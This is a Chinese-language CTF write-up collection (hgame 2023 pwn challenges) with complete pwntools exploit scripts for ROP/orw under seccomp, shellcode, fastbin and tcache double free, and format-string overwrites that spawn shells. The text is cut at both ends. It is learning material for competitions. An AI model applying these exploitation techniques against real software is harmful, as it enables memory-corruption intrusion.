u64(io.recv(6).ljust(8,b&quot;\\x00&quot;))libc_addr = main_arena - (0x7fa0ee626b78-0x7fa0ee262000)payload = cyclic(0x88)+b&quot;\\x71&quot;edit(0,payload)delete(1)payload = cyclic(0x8*10)+p64(0x8)+p64(elf.got[&#x27;free&#x27;])add(0x60,payload) #1gdb.attach(io)#0x45216 0x4526a 0xf02a4 0xf1147onegadget_addr = libc_addr + 0xf02a4edit(2,p64(onegadget_addr))io.recvuntil(&quot;Your choice :&quot;)io.sendline(b&quot;4&quot;)io.recvuntil(&quot;Index :&quot;)io.sendline(b&quot;2&quot;)io.interactive()\n\n","categories":["wp"]},{"title":"hgame2023","url":"/2023/01/10/hgame2023/","content":"orw以前没做过构造rop链的orw 记录一下\n[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/vuln&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\n保护没啥值得留意的 直接ida打开看一下main函数\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  init(argc, argv, envp);  sandbox();  puts(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;);  vuln();  return 0;&#125;\n\n开了沙盒 不出意外应该是禁用了execve 而system(“&#x2F;bin&#x2F;sh”)也是基于execve实现的 所以这里没有办法像以往一样简单的获取shell\nseccomp-tools dump .&#x2F;vuln\n查看一下是否如同猜想的一样\n\n当调用的函数为execve时进入0004 也就是return kill 禁止调用\n那么跟进一下vuln函数\nssize_t vuln()&#123;  char buf[256]; // [rsp+0h] [rbp-100h] BYREF  return read(0, buf, 0x130uLL);&#125;\n\n可以进行一次栈溢出 但是溢出的字节数只有0x28（还有8字节要给ebp）\n显然这点溢出长度只够我们泄露libc基址 但是由于被禁用了execve system和onegadget都用不了了\n但是如果想用orw的话 很明显 read和open需要的溢出长度远超过0x28\n溢出长度不够的情况一般两种解决办法 自己构造一次read 修改rdx的值 使得溢出长度足够 或者是构造一次read 往bss段写入rop链 随后栈迁移\n但是总归都是要自己调用read 并且我们还需要pop rsi pop rdx的指令地址 但是由于大部分的题目是动态链接 很难找到单独的rsi和rdx 本题也是没有的 这个时候你要想起来 题目所给的libc文件也是可以用ROPgadget查找指令地址的  只不过使用其指令还需要我们泄露libc基址\n那么初步的思路确定了 就可以开始第一步 先泄露基址 \nfrom pwn import*context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./vuln&quot;)#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31773)rdi_addr = 0x401393rsi_r15_addr = 0x401391puts_got = elf.got[&#x27;puts&#x27;]puts_plt = 0x401070main_addr = 0x4012f0read_plt = 0x401080ret_addr = 0x40101abss_addr = 0x404090+0x50io.recvuntil(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;)payload = cyclic(0x108)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)io.sendline(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))\n\n接下来是构造read read函数需要三个参数 rdi 控制第一个参数文件描述符 rsi控制写入地址 rdx控制写入字节数\n但是很明显0x28的溢出长度是不够我们构造如此多的参数 那么我们可以gdb动调看一下 如果我们不对这三个寄存器动任何手脚 其分别值为多少\n\nrdi满足条件 rdx为0x130 如果我们往bss段写入rop链的话 rdx也不用修改 那么只需要修改rsi就可以了\nROPgadget获取libc文件的pop rsi偏移 再加上libc基址获得pop rsi指令的地址\nio.recvuntil(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;)payload = cyclic(0x108)+p64(rsi_addr)+p64(bss_addr)+p64(read_addr)+p64(main_addr)io.sendline(payload)\n\n这里注意一下bss_addr 要和bss段的起始位置间隔一段距离 因为bss段比较靠近got表 可能会导致栈空间延申到got表 导致read失败 也是老生常谈的问题了\n那么接下里的难点就是构造rop链了 下面每行各自对应open write puts 应该是浅显易懂的\npayload = b&#x27;./flag&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr+0x100)+p64(rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(rdi_addr)+p64(bss_addr+0x100)+p64(puts_addr)\n\n完整exp:\nfrom pwn import*context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./vuln&quot;)io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)#io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31773)rdi_addr = 0x401393rsi_r15_addr = 0x401391puts_got = elf.got[&#x27;puts&#x27;]puts_plt = 0x401070main_addr = 0x4012f0read_plt = 0x401080ret_addr = 0x40101abss_addr = 0x404090+0x50io.recvuntil(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;)payload = cyclic(0x108)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)io.sendline(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = puts_addr-libc.sym[&#x27;puts&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]rsi_addr = libc_addr + 0x2601frdx_addr = libc_addr + 0x142c92puts_addr = libc_addr + libc.sym[&#x27;puts&#x27;]io.recvuntil(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;)payload = cyclic(0x108)+p64(rsi_addr)+p64(bss_addr)+p64(read_addr)+p64(main_addr)io.sendline(payload)open_addr = libc_addr + libc.sym[&#x27;open&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]payload = b&#x27;./flag&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr+0x100)+p64(rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(rdi_addr)+p64(bss_addr+0x100)+p64(puts_addr)io.sendline(payload)leave_addr = 0x4012beio.recvuntil(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;)payload = cyclic(0x100)+p64(bss_addr)+p64(leave_addr)io.sendline(payload)io.recv()io.recv()\n\nsimple_shellcode[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/vuln&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n\n保护全开 ida看一下main函数\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  init(argc, argv, envp);  mmap((void *)0xCAFE0000LL, 0x1000uLL, 7, 33, -1, 0LL);  puts(&quot;Please input your shellcode:&quot;);  read(0, (void *)0xCAFE0000LL, 0x10uLL);  sandbox();  MEMORY[0xCAFE0000]();  return 0;&#125;\n\nmmap将0xcafe0000~0xcafe1000这块区域的权限设置为了可读可写可执行 并且程序的最后还调用了这块区域\n明摆着是将shellcode写入到这块区域 同时给了一次写入的机会 但是只有10字节\n但是这次又有sandbox函数 看一下是禁用了哪些函数\n\n还是通过orw来读取flag吧  但是这次是采用shellcode的方式 首当其冲要解决的问题就是写入字节不够的问题\n这0x10字节的长度虽然不够我们写orw 但是可以供我们调用read函数\n但是如果我们想要全部参数都修改一次 也是会超出16字节的 所以还是和上题一样 动态调试看一下传完shellcode后各寄存器的默认值\n\n我们只需要修改rsi rdi即可 rax为read的系统调用号0 不需要修改\nshellcode = &#x27;&#x27;&#x27;mov esi ,0xcafe0500xor edi ,edisyscalljmp rsi&#x27;&#x27;&#x27;\n\n这里注意一下地址 和bss段同理 栈有可能会溢出到其他不可执行的区域 所以需要抬高一点栈帧空间\n随后就是orw的汇编:\nshellcode = f&quot;&quot;&quot;push 0x67616c66push (2)pop raxmov rdi, rspxor esi, esicdqsyscallmov r10d, 0x7fffffffmov rsi, raxpush (40)pop raxpush 1pop rdicdqsyscall&quot;&quot;&quot;\n\n完整exp:\nfrom pwn import*context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./vuln&quot;)#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31897)shellcode = &#x27;&#x27;&#x27;mov esi ,0xcafe0500xor edi ,edisyscalljmp rsi&#x27;&#x27;&#x27;io.sendline(asm(shellcode))shellcode = f&quot;&quot;&quot;push 0x67616c66push (2)pop raxmov rdi, rspxor esi, esicdqsyscallmov r10d, 0x7fffffffmov rsi, raxpush (40)pop raxpush 1pop rdicdqsyscall&quot;&quot;&quot;io.sendline(asm(shellcode))io.recv()io.recv()\n\nfast_note一道很常规的double free题 不过在最后修改malloc_hook的时候有点特殊 也算有学到新知识\n这题是libc 2.23版本 \n[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)[*] &#x27;/home/chen/vuln&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  int v3; // [rsp+14h] [rbp-Ch] BYREF  unsigned __int64 v4; // [rsp+18h] [rbp-8h]  v4 = __readfsqword(0x28u);  init(argc, argv, envp);  while ( 1 )  &#123;    while ( 1 )    &#123;      menu();      __isoc99_scanf(&quot;%d&quot;, &amp;v3);      if ( v3 != 2 )        break;      delete_note();    &#125;    if ( v3 &gt; 2 )    &#123;      if ( v3 == 3 )      &#123;        show_note(&quot;%d&quot;, &amp;v3);      &#125;      else      &#123;        if ( v3 == 4 )          exit(0);LABEL_13:        puts(&quot;Wrong choice!&quot;);      &#125;    &#125;    else    &#123;      if ( v3 != 1 )        goto LABEL_13;      add_note();    &#125;  &#125;&#125;\n\n没有edit函数 add函数的content输入没有堆溢出的机会 看一看delete函数\nunsigned __int64 delete_note()&#123;  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  printf(&quot;Index: &quot;);  __isoc99_scanf(&quot;%u&quot;, &amp;v1);  if ( v1 &lt;= 0xF )  &#123;    if ( (&amp;notes)[v1] )      free((&amp;notes)[v1]);    else      puts(&quot;Page not found.&quot;);  &#125;  else  &#123;    puts(&quot;There are only 16 pages in this notebook.&quot;);  &#125;  return __readfsqword(0x28u) ^ v2;&#125;\n\n堆块释放以后 没有对存放堆块的指针置零 存在UAF漏洞 再加上有show函数 那么泄露libc基址我们可以很轻松的通过unsortedbin来做到\nfrom pwn import*#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)elf = ELF(&quot;./vuln&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;io = remote(&quot;week-2.hgame.lwsec.cn&quot;,31198)def add(index,size,content):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&quot;1&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;Content: &quot;)    io.sendline(content)def delete(index):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&quot;2&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))def show(index):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&quot;3&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))add(0,0x80,b&#x27;aaaa&#x27;)add(1,0x60,b&#x27;aaaa&#x27;)add(2,0x60,b&#x27;aaaa&#x27;)delete(0)show(0)main_arena = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = main_arena - 88 - 0x3C4B20\n\n应该是很好理解 fastbin的范围只有0x20~0x80 那么我们释放一个0x80大小的chunk就会被放入unsortedbin 这时候其fd和bk域就会指向main_arena_addr 而delete函数没有对这个chunk的指针置零  导致这个我们仍然可以使用这个指针对chunk进行操作\n还有一点就是libc基址的计算办法 88这个gdb动调可以很明显的看出来 那这个0x3c4b20呢 以往我们用的是gdb动调看libc基址和当此程序运行时泄露的main_arean的偏移 但是有的时候题目远程靶机和本地的libc版本不一样 这个时候如果你不会用patchelf修改libc的话 可以通过ida打开题目所对应的libc文件\n寻找malloc_trim函数 \n\n对应的这个dword_1ecb80的偏移就是main_arean相较于libc基址的偏移\n接下来的任务是想办法获取shell 2.23的题目直接打malloc_hook就好了 如果没有开启FULL RELRO 的话还可以通过覆写got表来实现shell\n这里我们采用打got表 用的是double free的办法\nmalloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]delete(1)delete(2)delete(1)add(3,0x60,p64(malloc_hook-0x23))add(4,0x60,b&#x27;aaaa&#x27;)add(5,0x60,b&#x27;aaaa&#x27;)one_gadget = libc_addr + 0xf03a4payload = cyclic(0x13)+p64(one_gadget)add(6,0x60,payload)\n\n但是不管我们如果更换one_gadget的偏移 就是打不通 哪怕gdb动调已经可以看到malloc_hook已经被写入one_gadget了\n这是因为one_gadget的调用条件不满足\n那么常规的利用malloc函数触发malloc_hook肯定是不行的了 询问了其他师傅才知道 double free也能触发malloc_hook 为此也是十分好奇 去翻了翻double free的源码\nif (SINGLE_THREAD_P)      &#123;\t/* Check that the top of the bin is not the record we are going to\t   add (i.e., double free).  */\tif (__builtin_expect (old == p, 0))\t  malloc_printerr (&quot;double free or corruption (fasttop)&quot;);\tp-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);\t*fb = p;      &#125;\n\n当glibc检测到double free行为发生后 会调用malloc_printerr用来打印错误日志 但是基于本人水平也就只能朔源到这里了 以下均是猜想\n因为malloc_printerr是在malloc.c中定义的 所以调用malloc_printerr就会和malloc函数一样先对malloc_hook的内容进行if判断 如果不为0则执行\n完整exp:\nfrom pwn import*#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)elf = ELF(&quot;./vuln&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;io = remote(&quot;week-2.hgame.lwsec.cn&quot;,31198)def add(index,size,content):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&quot;1&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;Content: &quot;)    io.sendline(content)def delete(index):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&quot;2&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))def show(index):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&quot;3&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))add(0,0x80,b&#x27;aaaa&#x27;)add(1,0x60,b&#x27;aaaa&#x27;)add(2,0x60,b&#x27;aaaa&#x27;)delete(0)show(0)main_arena = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = main_arena - 88 - 0x3C4B20malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]delete(1)delete(2)delete(1)add(3,0x60,p64(malloc_hook-0x23))add(4,0x60,b&#x27;aaaa&#x27;)add(5,0x60,b&#x27;aaaa&#x27;)one_gadget = libc_addr + 0xf03a4payload = cyclic(0x13)+p64(one_gadget)add(6,0x60,payload)delete(3)delete(3)io.interactive()\n\nnew_fast_note这题的主体结构和上题一致 不过版本从2.23到了2.31 这给我们的unsortedbin泄露机制和double free都制造了困难\n由于多出了tcachebin 所以我们想要让一个chunk进入unsortedbin 要么就申请超出tcachebin范围 即0x400以上大小的chunk\n或者填满tcachebin的一个链表 然后再次释放 如果超出fastbin的范围就会被放入unsortedbin 这里采取第二种办法\nfrom pwn import*context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./vuln&quot;)#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)io = remote(&quot;week-2.hgame.lwsec.cn&quot;,32435)def add(index,size,content):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&quot;1&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;Content: &quot;)    io.sendline(content)def delete(index):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&quot;2&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))def show(index):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&quot;3&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))for i in range(0,8):    add(i,0x80,b&#x27;aaaa&#x27;)for i in range(0,7):    delete(i)delete(7)show(7)main_arena = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = main_arena-96-0x1ECB80\n\n接下来我们的思路要放在如何篡改free_hook来获取shell\n没有edit函数的情况下 又有UAF 我们很容易想到的是利用double free来做到任意地址写\n但是2.31的版本 glibc对于double free的检查机制更加严格了\ntypedef struct tcache_entry&#123;  struct tcache_entry *next;  //链表指针，对应chunk中的fd字段  /* This field exists to detect double frees.  */  struct tcache_perthread_struct *key;  //指向所属的tcache结构体，对应chunk中的bk字段&#125; tcache_entry;\n\n对于每一个tcache都有一个key指针指向\n借助这个key指针 plmalloc可以更好的对double free进行检查\nsize_t tc_idx = csize2tidx(size);//只要tcache不为空 并且free chunk在tcache范围中 都需要进行double free检查    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)    &#123;      /* Check to see if it&#x27;s already in the tcache.  */      tcache_entry *e = (tcache_entry *)chunk2mem(p);       /*        如果是这个chunk已经被放入tcache 那么key字段就已经有数据了 会被识别出来      */      if (__glibc_unlikely(e-&gt;key == tcache))//汇报错误信息      &#123;        tcache_entry *tmp;        LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx);        for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)          if (tmp == e)            malloc_printerr(&quot;free(): double free detected in tcache 2&quot;);      &#125;       if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  //通过检查，放入tcahce中      &#123;        tcache_put(p, tc_idx);        return;      &#125;    &#125;\n\n所以 如果我们还想要使用tcache double free的话 就只能修改key字段 或者是fastbin double free\n但是由于fastbin对于chunk的取出有着size域的检查 相对来说不好办 但是在2.27.9版本以后 tcache新增了stash机制\n要想明白这个机制的用处 我们先要清楚tcachebin的设计目的是什么\n在多线程的情况下 plmalloc会遇到主分配区被抢占的问题 只能等待或者是申请一个非主分配区\n针对这种情况 plmalloc为每个线程都涉及一个缓冲区 即tcache\n而stash机制就是 如果用户申请一个0x60大小的chunk tcache里面没有的话 就会进入分配区处理\n如果在fastbin中找到可以被申请的0x60chunk 系统就会认为将来还需要0x60大小的chunk 就会将fastbin中相同大小的chunk全部放入tcachebin中\n因此我们利用这个手法就可以实现 在fastbin中实现double free 而在tcache中进行任意地址chunk的申请\n完整exp:\nfrom pwn import*context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./vuln&quot;)#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)io = remote(&quot;week-2.hgame.lwsec.cn&quot;,32435)def add(index,size,content):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&quot;1&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;Content: &quot;)    io.sendline(content)def delete(index):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&quot;2&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))def show(index):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&quot;3&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))for i in range(0,8):    add(i,0x80,b&#x27;aaaa&#x27;)   //chunk0-chunk6用来填满tcache chunk7用来泄露基址for i in range(0,7):    delete(i)for i in range(0,7):    add(i,0x30,b&#x27;aaaa&#x27;)  //填满tcache 从而使chunk8和chunk9可以被放入fastbin 之所以index和前面的垃圾chunk一样 是因为                         //程序对于delete函数进行了限制 只能释放index&lt;=0xf的chunkfor i in range(8,11):    add(i,0x30,b&#x27;aaaa&#x27;)for i in range(0,7):    delete(i)delete(7)show(7)main_arena = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = main_arena-96-0x1ECB80free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]delete(8)delete(9)delete(8)for i in range(0,7):    add(i,0x30,b&#x27;aaaa&#x27;)          //将原本的tcache 0x40的链表全部的chunk申请 使其为空 触发stash机制add(8,0x30,p64(free_hook))add(9,0x30,b&#x27;aaaa&#x27;)add(11,0x30,b&#x27;aaaa&#x27;)one_gadget = libc_addr + 0xe3b01add(12,0x30,p64(system_addr))add(13,0x10,b&#x27;/bin/sh&#x27;)delete(13)io.interactive()\n\nYukkuriSay非栈上格式化字符串漏洞题\nchecksec 查看一下保护机制发现还有canary机制\n[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x3ff000)    RUNPATH:  &#x27;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/&#x27;\n\n由于本人没有安装libc2.31以上版本的ubuntu 所以本地和远程的环境不一样\n这里采用xclibc脚本更换二进制文件所依赖的libc\nGitHub - ef4tless&#x2F;xclibc: A tool to change the libc environment of running files(一个在CTF比赛中用于切换题目运行libc环境的工具)\nxclibc -x pwn libc-2.31.so\n\n再来看一下ida反编译出来的伪代码\nunsigned __int64 vuln()&#123;  int v1; // [rsp+8h] [rbp-118h]  char s1[4]; // [rsp+Ch] [rbp-114h] BYREF  char buf[264]; // [rsp+10h] [rbp-110h] BYREF  unsigned __int64 v4; // [rsp+118h] [rbp-8h]  v4 = __readfsqword(0x28u);  puts(&quot;What would you like to let Yukkri say?&quot;);  do  &#123;    v1 = read(0, buf, 0x100uLL);    if ( buf[v1 - 1] == 10 )      buf[v1 - 1] = 0;    print_str(buf);    puts(&quot;anything else?(Y/n)&quot;);    __isoc99_scanf(&quot;%2s&quot;, s1);  &#125;  while ( strcmp(s1, &quot;n&quot;) &amp;&amp; strcmp(s1, &quot;N&quot;) );  puts(&quot;Yukkri prepared a gift for you: &quot;);  read(0, str, 0x100uLL);  printf(str);  return __readfsqword(0x28u) ^ v4;&#125;\n\n跟进一下print_str函数\nint __fastcall print_str(const char *a1)&#123;  int n; // [rsp+1Ch] [rbp-24h]  int ii; // [rsp+20h] [rbp-20h]  int l; // [rsp+24h] [rbp-1Ch]  int m; // [rsp+28h] [rbp-18h]  int i; // [rsp+2Ch] [rbp-14h]  int k; // [rsp+30h] [rbp-10h]  int v8; // [rsp+34h] [rbp-Ch]  const char *j; // [rsp+38h] [rbp-8h]  v8 = strlen(a1);  if ( v8 &gt; 20 )  &#123;    if ( v8 &gt; 50 )    &#123;      printf(&quot;%*s&quot;, 51, (const char *)&amp;unk_402008);      for ( i = 0; i &lt;= 51; ++i )        putchar(95);      printf(&quot;\\n%*s/ %*s \\\\\\n&quot;, 50, (const char *)&amp;unk_402008, 50, (const char *)&amp;unk_402008);      for ( j = a1; j &lt; &amp;a1[v8]; j += 50 )        printf(&quot;%*s| %-50.50s |\\n&quot;, 50, (const char *)&amp;unk_402008, j);      printf(&quot;%*s\\\\___  &quot;, 50, (const char *)&amp;unk_402008);      for ( k = 0; k &lt;= 46; ++k )        putchar(95);    &#125;    else    &#123;      printf(&quot;%*s&quot;, 51, (const char *)&amp;unk_402008);      for ( l = 0; l &lt;= v8 + 1; ++l )        putchar(95);      printf(&quot;\\n%*s/ %*s \\\\\\n&quot;, 50, (const char *)&amp;unk_402008, v8, (const char *)&amp;unk_402008);      printf(&quot;%*s| %s |\\n&quot;, 50, (const char *)&amp;unk_402008, a1);      printf(&quot;%*s\\\\___  &quot;, 50, (const char *)&amp;unk_402008);      for ( m = 0; m &lt; v8 - 3; ++m )        putchar(95);    &#125;  &#125;  else  &#123;    printf(&quot;%*s&quot;, 51, (const char *)&amp;unk_402008);    for ( n = 0; n &lt;= 21; ++n )      putchar(95);    printf(&quot;\\n%*s/ %*s \\\\\\n&quot;, 50, (const char *)&amp;unk_402008, 20, (const char *)&amp;unk_402008);    printf(      &quot;%*s| %*s%s%*s |\\n&quot;,      50,      (const char *)&amp;unk_402008,      (20 - v8) / 2 + v8 % 2,      (const char *)&amp;unk_402008,      a1,      (20 - v8) / 2,      (const char *)&amp;unk_402008);    printf(&quot;%*s\\\\___  &quot;, 50, (const char *)&amp;unk_402008);    for ( ii = 0; ii &lt;= 16; ++ii )      putchar(95);  &#125;  puts(&quot;/&quot;);  printf(&quot;%*s|/\\n&quot;, 54, (const char *)&amp;unk_402008);  return printf(&quot;%s&quot;, yukkuri);&#125;\n\n直接看不好看懂 直接运行一下脚本 发现是一个图形\n\n分析一下题目给我们的机会 首先是可以无限循环对栈上数据0x100字节大小的修改 并且还可以泄露栈上的数据\n然后还有一次非栈上格式化字符串漏洞的机会\n这题要想获取shell 只能通过覆盖ret addr 但是由于开启了canary 常规的栈溢出行不通 write泄露的栈内容长度又够不到canary\n那么只能想办法通过非栈上格式化字符串漏洞来任意写到栈上的ret addr 使其为onegadget 这样就可以成功获取shell\n那么我们就需要泄露栈地址和libc基址\ngdb动调看一下\n\n当我们输入的payload大于0x50字节的时候 断点打在0x4014EF处 我们发现payload&#x3D; cyclic(0x100)时\n可以泄露出栈上的地址 当我们输入的payload &#x3D; cyclic(0x98)时 可以泄露出stderr的真实地址\n\n我们成功获得了栈地址和libc基址\nfrom pwn import *context.log_level = &quot;debug&quot;def splitaddr(target_addr):    addr = []    curr = 0              for _ in range(4):        num = target_addr % 65536        tmp = (num - curr + 65536) % 65536        addr.append(tmp)        curr = (curr + tmp) % 65536        target_addr = target_addr &gt;&gt; 16    return addrio = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)libc =ELF(&quot;./libc-2.31.so&quot;)io.recvuntil(&quot;What would you like to let Yukkri say?&quot;)payload = cyclic(0x98)io.send(payload)addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = addr - libc.sym[&#x27;_IO_2_1_stderr_&#x27;]success(hex(libc_addr))io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;Y&#x27;)payload = cyclic(0x100)io.send(payload)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x8success(hex(stack_addr))io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;Y&#x27;)\n\n首先由于非栈上格式化字符串并没有办法直接对栈数据更改 所以我们还需要先修改栈上的数据\npayload = p64(stack_addr)payload += p64(stack_addr+2)payload += p64(stack_addr+4)payload += p64(stack_addr+6)io.send(payload)io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;n&#x27;)\n\n非栈上格式化字符串会在栈专题中讲 所以这里就不解释为什么这么写了\n最后的关键在于说ret addr的地址是在哪里 我们上面动调也可以看到 是位于stack_addr-0x8处 所以这里任意写其内容为onegadget\n完整exp:\nfrom pwn import *context.log_level = &quot;debug&quot;def splitaddr(target_addr):    addr = []    curr = 0              for _ in range(4):        num = target_addr % 65536        tmp = (num - curr + 65536) % 65536        addr.append(tmp)        curr = (curr + tmp) % 65536        target_addr = target_addr &gt;&gt; 16    return addrio = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)libc =ELF(&quot;./libc-2.31.so&quot;)io.recvuntil(&quot;What would you like to let Yukkri say?&quot;)payload = cyclic(0x98)io.send(payload)addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = addr - libc.sym[&#x27;_IO_2_1_stderr_&#x27;]success(hex(libc_addr))io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;Y&#x27;)payload = cyclic(0x100)io.send(payload)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x8success(hex(stack_addr))io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;Y&#x27;)payload = p64(stack_addr)payload += p64(stack_addr+2)payload += p64(stack_addr+4)payload += p64(stack_addr+6)io.send(payload)io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;n&#x27;)onegadget_addr = 0xe3b01+libc_addraddr = splitaddr(onegadget_addr)payload = b&quot;%&quot; + str(addr[0]).encode() + b&quot;lx%8$hn&quot;payload += b&quot;%&quot; + str(addr[1]).encode() + b&quot;lx%9$hn&quot;payload += b&quot;%&quot; + str(addr[2]).encode() + b&quot;lx%10$hn&quot;payload += b&quot;%&quot; + str(addr[3]).encode() + b&quot;lx%11$hn&quot;io.send(payload+b&#x27;\\x00&#x27;)io.interactive()\n\nnote_context这题是赛后复现的 学到挺多东西 顺便巩固了setcontext的利用\n\n保护全开 环境是2.32\n并且开启了沙盒\n\n经典菜单题 伪代码这里就不放了 一共给了四个函数\nadd函数可以申请chunk 